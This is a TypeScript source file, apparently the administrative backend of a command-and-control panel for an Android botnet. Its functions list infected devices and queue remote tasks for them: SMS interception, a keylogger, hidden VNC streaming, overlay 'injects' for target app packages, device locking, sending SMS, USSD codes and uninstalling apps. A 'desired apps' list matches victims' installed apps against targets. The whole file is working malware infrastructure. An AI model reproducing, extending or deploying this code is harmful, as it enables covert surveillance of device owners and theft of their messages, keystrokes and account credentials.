// api/src/admin-api/bots.ts
// Controlador de Bots (API JSON para o painel administrativo)
// Baseado em bots.class.php, adaptado para Cloudflare Workers + Supabase
// Atualizado para suportar prioridade de tarefas e ordenação correta

import { SupabaseClient } from '@supabase/supabase-js';
import { apps2array, package_list_to_array, isValidBotId } from '../shared/utils';
import type { Bot, Task } from '../shared/types';

// ----------------------------------------------------------------------
// Tipos auxiliares
// ----------------------------------------------------------------------
export interface ListBotsFilters {
  country?: string;
  android?: string;
  status?: string;
  tag?: string;
  comment?: string;
  ip?: string;
  alive?: boolean;
  activated?: boolean;
  non_desired_only?: boolean;
  page?: number;
  rows?: number;
  sort_by?: string; // ex: 'last_seen_desc', 'registered_asc'
}

export interface CommandResult {
  success: boolean;
  message: string;
  data?: any;
}

// ----------------------------------------------------------------------
// Prioridades padrão para tarefas
// ----------------------------------------------------------------------
const PRIORITY_HIGH = 1;
const PRIORITY_MEDIUM = 2;
const PRIORITY_LOW = 3;

// ----------------------------------------------------------------------
// Função auxiliar para criar tarefa (com prioridade)
// ----------------------------------------------------------------------
async function createTask(
  supabase: SupabaseClient,
  botId: string,
  taskType: string,
  data: string,
  priority: number = PRIORITY_LOW,
): Promise<void> {
  await supabase.from('bots_tasks').insert({
    bot_id: botId,
    task_type: taskType,
    data,
    status: 'waiting',
    priority,
  });
}

// ----------------------------------------------------------------------
// Função auxiliar para remover tarefas de tipos específicos
// ----------------------------------------------------------------------
async function deleteTasksByType(
  supabase: SupabaseClient,
  botId: string,
  types: string[],
): Promise<void> {
  await supabase
    .from('bots_tasks')
    .delete()
    .eq('bot_id', botId)
    .in('task_type', types);
}

// ----------------------------------------------------------------------
// Função para recuperar tarefas presas em "in_process"
// ----------------------------------------------------------------------
export async function recoverStuckTasks(
  supabase: SupabaseClient,
  timeoutMinutes: number = 5,
): Promise<CommandResult> {
  const cutoff = new Date(Date.now() - timeoutMinutes * 60 * 1000).toISOString();

  const { data: stuckTasks, error: selectError } = await supabase
    .from('bots_tasks')
    .select('id')
    .eq('status', 'in_process')
    .lt('created_at', cutoff);

  if (selectError) {
    console.error('recoverStuckTasks select error:', selectError);
    return { success: false, message: 'Erro ao buscar tarefas presas' };
  }

  if (!stuckTasks || stuckTasks.length === 0) {
    return { success: true, message: 'Nenhuma tarefa presa encontrada' };
  }

  const taskIds = stuckTasks.map((t) => t.id);
  const { error: updateError } = await supabase
    .from('bots_tasks')
    .update({ status: 'failed' })
    .in('id', taskIds);

  if (updateError) {
    console.error('recoverStuckTasks update error:', updateError);
    return { success: false, message: 'Erro ao atualizar tarefas presas' };
  }

  console.log(`Tarefas presas recuperadas: ${taskIds.length}`);
  return { success: true, message: `${taskIds.length} tarefa(s) marcada(s) como failed` };
}

// ----------------------------------------------------------------------
// Listagem de bots com filtros (CORRIGIDO: ordenação por last_seen)
// ----------------------------------------------------------------------
export async function listBots(
  supabase: SupabaseClient,
  filters: ListBotsFilters = {},
): Promise<Bot[]> {
  let query = supabase.from('bots').select('*');

  if (filters.country) {
    query = query.eq('country', filters.country);
  }
  if (filters.android) {
    query = query.like('android', `%${filters.android}%`);
  }
  if (filters.tag) {
    query = query.eq('tag', filters.tag);
  }
  if (filters.comment) {
    query = query.like('comment', `%${filters.comment}%`);
  }
  if (filters.ip) {
    query = query.like('ip', `%${filters.ip}%`);
  }
  if (filters.alive) {
    const aliveSince = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    query = query.gte('last_seen', aliveSince);
  }
  if (filters.activated) {
    query = query.like('extra_info_json', '%"HAS_ACSB":1%');
  }

  // ===== CORREÇÃO: mapeamento de campos de ordenação =====
  const sortFieldMap: Record<string, string> = {
    last: 'last_seen',
    'last_seen': 'last_seen',
    registered: 'registered',
    id: 'id',
  };

  const sort = filters.sort_by || 'last_seen_desc';
  const parts = sort.split('_');
  let field = parts[0];
  let direction = parts[1] || 'desc';

  // Mapeia o campo para o nome real da coluna
  field = sortFieldMap[field] || field;

  // Ordena (direção: 'asc' ou 'desc')
  const ascending = direction.toLowerCase() === 'asc';
  query = query.order(field, { ascending });

  // paginação
  const page = filters.page || 0;
  const rows = filters.rows || 40;
  const from = page * rows;
  const to = from + rows - 1;
  query = query.range(from, to);

  const { data, error } = await query;
  if (error) {
    console.error('listBots error:', error);
    throw error;
  }
  return (data as Bot[]) || [];
}

// ----------------------------------------------------------------------
// Detalhes completos de um bot
// ----------------------------------------------------------------------
export async function getBotDetail(
  supabase: SupabaseClient,
  botId: string,
): Promise<Bot | null> {
  const { data, error } = await supabase
    .from('bots')
    .select('*')
    .eq('bot_id', botId)
    .maybeSingle();

  if (error) throw error;
  return data as Bot | null;
}

// ----------------------------------------------------------------------
// Lock / Unlock (prioridade média)
// ----------------------------------------------------------------------
export async function lockBot(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_locked: true }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['lock_on', 'lock_off']);
  await createTask(supabase, botId, 'lock_on', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Bot locked' };
}

export async function unlockBot(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_locked: false }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['lock_on', 'lock_off']);
  await createTask(supabase, botId, 'lock_off', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Bot unlocked' };
}

// ----------------------------------------------------------------------
// Interceptação de SMS (prioridade média)
// ----------------------------------------------------------------------
export async function startIntercept(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_sms_admin: true }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['intercept_on', 'intercept_off']);
  await createTask(supabase, botId, 'intercept_on', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'SMS Intercept enabled' };
}

export async function stopIntercept(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_sms_admin: false }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['intercept_on', 'intercept_off']);
  await createTask(supabase, botId, 'intercept_off', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'SMS Intercept disabled' };
}

// ----------------------------------------------------------------------
// Keylogger (prioridade média)
// ----------------------------------------------------------------------
export async function startKeylogger(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ keylogger: true }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['start_keylogger', 'stop_keylogger']);
  await createTask(supabase, botId, 'start_keylogger', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Keylogger enabled' };
}

export async function stopKeylogger(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ keylogger: false }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['start_keylogger', 'stop_keylogger']);
  await createTask(supabase, botId, 'stop_keylogger', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Keylogger disabled' };
}

// ----------------------------------------------------------------------
// Antisleep (prioridade média)
// ----------------------------------------------------------------------
export async function startFg(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_fg: true }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['start_fg', 'stop_fg']);
  await createTask(supabase, botId, 'start_fg', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Antisleep enabled' };
}

export async function stopFg(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await supabase.from('bots').update({ is_fg: false }).eq('bot_id', botId);
  await deleteTasksByType(supabase, botId, ['start_fg', 'stop_fg']);
  await createTask(supabase, botId, 'stop_fg', 'true', PRIORITY_MEDIUM);
  return { success: true, message: 'Antisleep disabled' };
}

// ----------------------------------------------------------------------
// VNC (prioridade alta)
// ----------------------------------------------------------------------
export interface StartVncOptions {
  hidden?: boolean;
  screen?: boolean;
  silent?: boolean;
  black?: boolean;
}

export async function startVnc(
  supabase: SupabaseClient,
  botId: string,
  options: StartVncOptions = {},
): Promise<CommandResult> {
  let vncData = '';
  if (options.hidden) {
    vncData = 'STREAM_LAYOUT;';
  } else if (options.screen) {
    vncData = 'STREAM_LAYOUT;STREAM_SCREEN;';
  } else {
    vncData = 'STREAM_LAYOUT;';
  }
  if (options.silent) vncData += 'SILENT;';
  if (options.black) vncData += 'BLACK;';

  await deleteTasksByType(supabase, botId, ['vnc_start', 'vnc_stop']);
  await createTask(supabase, botId, 'vnc_start', vncData, PRIORITY_HIGH);
  return { success: true, message: 'VNC start task added' };
}

export async function stopVnc(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await deleteTasksByType(supabase, botId, ['vnc_start', 'vnc_stop']);
  await createTask(supabase, botId, 'vnc_stop', 'true', PRIORITY_HIGH);
  return { success: true, message: 'VNC stop task added' };
}

// ----------------------------------------------------------------------
// Kill bot (prioridade alta)
// ----------------------------------------------------------------------
export async function killBot(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  await deleteTasksByType(supabase, botId, ['kill_bot']);
  await createTask(supabase, botId, 'kill_bot', 'true', PRIORITY_HIGH);
  return { success: true, message: 'Kill command sent' };
}

// ----------------------------------------------------------------------
// Delete bot
// ----------------------------------------------------------------------
export async function deleteBot(
  supabase: SupabaseClient,
  botId: string,
): Promise<CommandResult> {
  const tables = ['bots', 'bots_tasks', 'vnc_tasks', 'sms', 'pushes_bots', 'smarts_bots', 'smarts_data'];
  for (const table of tables) {
    await supabase.from(table).delete().eq('bot_id', botId);
  }
  return { success: true, message: 'Bot deleted' };
}

export async function deleteOlds(
  supabase: SupabaseClient,
  days: number,
  withLogs: boolean = false,
): Promise<CommandResult> {
  if (days < 1) {
    return { success: false, message: 'Wrong amount of days' };
  }

  const cutoff = new Date(Date.now() - days * 24 * 60 * 60 * 1000).toISOString();
  const { data: oldBots, error } = await supabase
    .from('bots')
    .select('bot_id')
    .lt('last_seen', cutoff);

  if (error) throw error;
  if (!oldBots || oldBots.length === 0) {
    return { success: true, message: 'No bots to delete' };
  }

  const botIds = oldBots.map((b) => b.bot_id);
  const tables = ['bots', 'bots_tasks', 'vnc_tasks', 'sms', 'pushes_bots', 'smarts_bots'];
  for (const table of tables) {
    await supabase.from(table).delete().in('bot_id', botIds);
  }

  if (withLogs) {
    await supabase.from('smarts_data').delete().in('bot_id', botIds);
  }

  return { success: true, message: `Bots older than ${days} days were deleted` };
}

// ----------------------------------------------------------------------
// Comando genérico (prioridade baixa, exceto quando especificado)
// ----------------------------------------------------------------------
export async function sendCommand(
  supabase: SupabaseClient,
  botId: string | string[],
  command: string,
  data?: any,
): Promise<CommandResult> {
  const botIds = Array.isArray(botId) ? botId : [botId];

  for (const id of botIds) {
    if (!isValidBotId(id)) continue;

    switch (command) {
      case 'push': {
        const { title, text, pkg } = data || {};
        if (!title || !text) {
          return { success: false, message: 'Title or Text can not be empty' };
        }
        await createTask(supabase, id, 'push', `${title}|${text}|${pkg || ''}`, PRIORITY_LOW);
        break;
      }
      case 'ussd': {
        if (!data || !data.code) {
          return { success: false, message: 'USSD code can not be empty' };
        }
        await createTask(supabase, id, 'ussd', data.code, PRIORITY_LOW);
        break;
      }
      case 'sms': {
        const { phone, text } = data || {};
        if (!phone || !text) {
          return { success: false, message: 'Number or Text can not be empty' };
        }
        await createTask(supabase, id, 'sms', `${phone}|${text}`, PRIORITY_LOW);
        break;
      }
      case 'open_url': {
        const { url, open_type } = data || {};
        if (!url) {
          return { success: false, message: 'URL can not be empty' };
        }
        let finalUrl = url;
        if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
          finalUrl = 'http://' + finalUrl;
        }
        const taskData = open_type === 'browser' ? `BROWSER|${finalUrl}` : finalUrl;
        await createTask(supabase, id, 'open_url', taskData, PRIORITY_LOW);
        break;
      }
      case 'run_app': {
        const { pkg } = data || {};
        if (!pkg || !pkg.includes('.')) {
          return { success: false, message: 'Invalid package name' };
        }
        await createTask(supabase, id, 'run_app', pkg, PRIORITY_LOW);
        break;
      }
      case 'uninstall_apps': {
        const { pkgs } = data || {};
        const list = package_list_to_array(pkgs || '');
        if (list.length === 0) {
          return { success: false, message: 'Apps list can not be empty' };
        }
        await createTask(supabase, id, 'uninstall_apps', list.join(','), PRIORITY_LOW);
        break;
      }
      case 'show_inject': {
        const { pkg } = data || {};
        if (!pkg) {
          return { success: false, message: 'Package name can not be empty' };
        }
        await supabase.from('smarts_bots').upsert(
          { bot_id: id, smart_id: await getSmartIdByPackage(supabase, pkg), is_active: 1 },
          { onConflict: 'smart_id,bot_id' },
        );
        await createTask(supabase, id, 'show_inject', pkg, PRIORITY_HIGH);
        break;
      }
      default:
        return { success: false, message: `Unknown command: ${command}` };
    }
  }

  const count = botIds.length;
  return {
    success: true,
    message: count === 1 ? 'Task added to the Bot Task list' : `${count} tasks added to the Bot Task list`,
  };
}

// Função auxiliar para obter smart_id pelo package
async function getSmartIdByPackage(
  supabase: SupabaseClient,
  pkg: string,
): Promise<number | undefined> {
  const { data } = await supabase
    .from('smarts')
    .select('id')
    .eq('package', pkg)
    .maybeSingle();
  return data?.id;
}

// ----------------------------------------------------------------------
// Logs e patterns (stubs)
// ----------------------------------------------------------------------
export async function getBotLog(
  supabase: SupabaseClient,
  botId: string,
  filter?: string,
): Promise<string> {
  return `Log for bot ${botId} is not available via API (file system not accessible). Filter: ${filter || ''}`;
}

export async function parsePatterns(
  supabase: SupabaseClient,
  botId: string,
): Promise<string> {
  return `Pattern analysis for bot ${botId} is not available (file system not accessible).`;
}

// ----------------------------------------------------------------------
// Apps (instalados, desejados, antivírus)
// ----------------------------------------------------------------------
export async function getBotApps(
  supabase: SupabaseClient,
  botId: string,
): Promise<{
  installed: string[];
  desired: string[];
  antivirus: string[];
}> {
  const { data: bot } = await supabase
    .from('bots')
    .select('apps')
    .eq('bot_id', botId)
    .maybeSingle();

  if (!bot) {
    return { installed: [], desired: [], antivirus: [] };
  }

  const installed = apps2array(bot.apps || '');

  const { data: config } = await supabase
    .from('config')
    .select('value')
    .eq('name', 'desired_apps')
    .maybeSingle();

  const desiredAll = config?.value?.split('\n').filter(Boolean) || [];
  const desired = desiredAll.filter((app) => installed.includes(app.trim()));

  const antivirus: string[] = [];

  return { installed, desired, antivirus };
}

// ----------------------------------------------------------------------
// Comandos em massa
// ----------------------------------------------------------------------
export async function lockBots(
  supabase: SupabaseClient,
  botIds: string[],
): Promise<CommandResult> {
  for (const id of botIds) {
    await lockBot(supabase, id);
  }
  return { success: true, message: `${botIds.length} bots locked` };
}

export async function unlockBots(
  supabase: SupabaseClient,
  botIds: string[],
): Promise<CommandResult> {
  for (const id of botIds) {
    await unlockBot(supabase, id);
  }
  return { success: true, message: `${botIds.length} bots unlocked` };
}